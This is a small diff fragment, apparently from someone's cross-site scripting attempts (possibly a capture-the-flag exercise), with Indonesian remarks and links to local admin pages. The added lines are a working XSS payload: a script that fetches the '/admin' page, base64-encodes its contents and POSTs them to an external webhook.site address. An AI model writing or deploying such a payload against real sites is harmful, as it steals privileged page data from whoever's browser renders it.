@@ -175,3 +175,16 @@ fetch('/admin')
 <a href="http://127.0.0.1:9001/admin">Aku admin</a>
 <a href="http://127.0.0.1:3000/admin">Aku admin</a>
 
+
+pls bisa yah
+<script>
+fetch('/admin')
+  .then(r => r.text())
+  .then(f => fetch('https://webhook.site/d0822fa4-718e-4117-9300-ba5c8de710d7', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: btoa(f)
+  }));
+</script>
+
+
